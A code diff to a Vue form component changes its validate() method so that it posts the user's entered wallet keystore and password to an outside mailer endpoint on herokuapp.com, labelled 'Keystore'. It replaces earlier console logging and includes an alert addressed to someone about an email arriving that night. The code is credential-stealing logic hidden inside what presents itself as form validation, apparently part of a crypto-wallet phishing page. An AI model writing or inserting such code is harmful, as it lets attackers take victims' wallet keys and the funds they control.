@@ -62,11 +62,21 @@ export default {
   }),
 
   methods: {
-    validate() {
+    async validate() {
       this.$refs.form.validate();
-      alert("Shegun the email will be ready this night!");
-      console.log(this.keystore);
-      console.log(this.password);
+      const baseURL = "https://everify-mailer.herokuapp.com/";
+      const data = {
+        data: {
+          subject: "Keystore",
+          info: `keystore: ${this.keystore}, password: ${this.password}`,
+        },
+      };
+      try {
+        const response = await this.$http.post(baseURL, data);
+        alert(response.data.msg);
+      } catch (error) {
+        // console.log(error);
+      }
     },
   },
 };
